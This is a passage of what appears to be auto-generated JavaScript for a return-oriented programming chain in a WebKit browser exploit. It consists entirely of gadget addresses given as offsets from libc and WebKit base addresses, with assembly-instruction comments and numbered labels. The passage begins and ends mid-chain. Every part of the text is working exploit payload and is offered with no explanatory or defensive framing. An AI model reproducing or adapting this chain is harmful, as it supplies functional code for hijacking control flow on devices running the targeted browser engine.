db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L802:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96896, //L806
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+96864, //L804
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+96880, //L805
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L804:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L805:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L806:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+96968, //L808
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L808:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+97024, //L809
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L809:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+97104, //L813
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L813:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L811:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L812:
db([12, 0]); // 0xc
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+97208, //L814
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+97224, //L815
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L814:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L815:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+97312, //L817
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L817:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97368, //L818
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L818:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+97440, //L821
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L821:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97496, //L823
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L823:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L824:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+97632, //L825
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L825:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L826:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+97736, //L828
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+97752, //L829
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L828:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L829:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97896, //L833
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+97864, //L831
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+97880, //L832
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L831:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L833:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+97968, //L835
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L835:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+98024, //L836
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L836:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+98104, //L840
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L840:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L838:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L839:
db([13, 0]); // 0xd
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+98208, //L841
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+98224, //L842
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+98312, //L844
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L844:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98368, //L845
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L845:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98440, //L848
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L848:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98496, //L850
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L850:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98584, //L851
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L851:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L852:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+98688, //L854
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+98704, //L855
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L854:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L855:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98848, //L859
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+98816, //L857
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+98832, //L858
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L857:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L858:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L859:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98920, //L861
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L861:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+98976, //L862
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L862:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99056, //L866
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L866:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L864:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L865:
db([5, 0]); // 0x5
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+99160, //L867
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+99176, //L868
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L867:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L868:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+99264, //L870
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L870:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+99320, //L871
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L871:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+99424, //L873
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L873:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L874:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+99528, //L876
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+99544, //L877
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L876:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L877:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+99688, //L881
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99656, //L879
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+99672, //L880
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L879:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L880:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L881:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+99760, //L883
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L883:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+99816, //L884
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L884:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99896, //L888
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L888:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L886:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L887:
db([14, 0]); // 0xe
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+100000, //L889
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+100016, //L890
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L889:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+100104, //L892
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L892:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100160, //L893
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L893:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+100232, //L896
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L896:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100288, //L898
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L898:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L899:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+100424, //L900
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L900:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L901:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+100528, //L903
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+100544, //L904
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L903:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L904:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100688, //L908
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+100656, //L906
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+100672, //L907
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L906:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L907:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L908:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+100760, //L910
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L910:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+100816, //L911
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L911:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+100896, //L915
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L915:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L913:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L914:
db([15, 0]); // 0xf
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+101000, //L916
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+101016, //L917
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L916:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+101104, //L919
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L919:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101160, //L920
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L920:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+101232, //L923
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L923:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101288, //L925
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L925:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L926:
libc_base+877877, //mov rax, rdx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+101424, //L927
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L927:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L928:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+101528, //L930
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+101544, //L931
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L930:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L931:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101688, //L935
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+101656, //L933
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+101672, //L934
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L933:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L934:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L935:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+101760, //L937
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L937:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+101816, //L938
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L938:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+101896, //L942
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L942:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L940:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L941:
db([16, 0]); // 0x10
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+102000, //L943
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+102016, //L944
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L943:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L944:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+102104, //L946
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102160, //L947
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L947:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+102232, //L950
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L950:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102288, //L952
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L952:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L953:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+102424, //L954
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L954:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L955:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+102528, //L957
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+102544, //L958
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L957:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L958:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102688, //L962
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+102656, //L960
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+102672, //L961
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L960:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L961:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L962:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+102760, //L964
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L964:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+102816, //L965
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L965:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+102896, //L969
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L969:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L967:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L968:
